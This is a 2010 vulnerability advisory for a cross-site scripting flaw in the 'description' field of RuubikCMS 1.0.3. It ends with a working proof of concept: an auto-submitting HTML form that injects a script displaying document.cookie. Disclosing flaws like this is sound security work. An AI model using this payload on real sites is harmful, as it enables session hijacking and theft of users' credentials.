Vulnerability ID: HTB22380
Reference: http://www.htbridge.ch/advisory/xss_vulnerability_in_ruubikcms.html
Product: RuubikCMS
Vendor: Piuha
Vulnerable Version: 1.0.3 and Probably Prior Versions
Vendor Notification: 10 May 2010 
Vulnerability Type: XSS (Cross Site Scripting)
Status: Not Fixed, Vendor Alerted, Awaiting Vendor Response
Risk level: Medium 
Credit: High-Tech Bridge SA (http://www.htbridge.ch/) 

Vulnerability Details:
User can execute arbitrary JavaScript code within the vulnerable application. 

The vulnerability exists due to failure in the "ruubikcms/cms/index.php" script to properly sanitize user-supplied input in "description" variable. Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.

An attacker can use browser to exploit this vulnerability. The following PoC is available:

<form action="http://example.com/ruubikcms/cms/index.php?p=home" method="post" name="main" >
	<input type="hidden" name="save" value="1" />
	<input type="hidden" name="ordernum" value="1" />
	<input type="hidden" name="name" value="Home" />
	<input type="hidden" name="header1" value="Home" />
	<input type="hidden" name="pageurl" value="home" />
	<input type="hidden" name="pagelink" value="%2Findex.php%2Fhome" />
	<input type="hidden" name="mother_hidden" value="" />
	<input type="hidden" name="creator" value="admin" />
	<input type="hidden" name="title" value="" />
	<input type="hidden" name="description" value='hello"><script>alert(document.cookie)</script>' />
	<input type="hidden" name="keywords" value="" />
	<input type="hidden" name="extracode" value="" />
	<input type="hidden" name="picfile1" value="" />
	<input type="hidden" name="picfile2" value="" />
	<input type="hidden" name="tinyMCE" value="page content here..." />
</form>
<script>
document.main.submit();
</script>




